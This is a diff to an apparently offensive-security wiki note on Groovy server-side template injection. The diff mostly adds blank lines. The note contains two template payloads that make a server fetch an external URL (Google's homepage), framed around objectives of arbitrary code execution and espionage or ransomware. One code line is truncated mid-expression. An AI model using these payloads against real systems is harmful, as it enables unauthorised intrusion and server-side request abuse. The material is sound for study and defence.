@@ -36,11 +36,15 @@ The technical explanation of this procedure is that we are exploiting a vulnerab
 
 The business value of this procedure is that it allows an attacker to gain access to sensitive information or take control of a server. This can be used for corporate espionage, data theft, or even ransomware attacks.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable server-side template engine
 
 1. Groovy installed on the attacking machine
+
+ 
 
 ## Defense
 
@@ -50,21 +54,33 @@ The business value of this procedure is that it allows an attacker to gain acces
 
 1. Implement access controls to limit the impact of successful attacks
 
+ 
+
 ## Objectives
 
 1. Inject malicious code into the server-side template
 
 1. Execute arbitrary code on the server
 
+ 
+
 # Instructions
 
 1. To retrieve the Google homepage, use the following commands:
 
+ 
+
+
+
 **Code**: [[${"http://www.google.com".toURL().text}
 ${new URL(]]
 
+
+
 > 1. ${"http://www.google.com".toURL().text} - This command will retrieve the HTML content of the Google homepage by converting the URL string into a URL object and then using the 'text' method to retrieve the content as a string.
 2. ${new URL("http://www.google.com").getText()} - This command will retrieve the HTML content of the Google homepage by creating a new URL object and then using the 'getText' method to retrieve the content as a string.
+
+
 
 **Command** ([[Retrieve text from Google homepage using Groovy String]]):
 
@@ -72,11 +88,17 @@ ${new URL(]]
 ${"http://www.google.com".toURL().text}
 ```
 
+
+
+
+
 **Command** ([[Retrieve text from Google homepage using Groovy URL]]):
 
 ```bash
 ${new URL("http://www.google.com").getText()}
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -99,3 +121,5 @@ ${new URL("http://www.google.com").getText()}
 - [[Groovy]]
 - [[Groovy - HTTP request:]]
 - [[Server Side Template Injection]]
+
+
